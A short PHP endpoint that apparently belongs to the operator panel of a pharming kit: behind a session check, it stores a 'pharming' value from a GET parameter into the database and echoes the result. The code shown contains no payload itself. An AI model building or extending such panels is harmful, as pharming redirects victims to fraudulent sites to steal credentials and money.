<?php @session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }	?>
<?php
require_once('../includes.php');

if( isset($_GET['pharming']) && !empty($_GET['pharming']) ){

	$Datos = array ('pharming' => $_GET['pharming'] );
	$UpdateBuscar = array('id' => 1) ;
	$Result = $DB->Update('pharming' , false , $Datos , $UpdateBuscar) ;
	echo $Result['msg'] ;


}

?>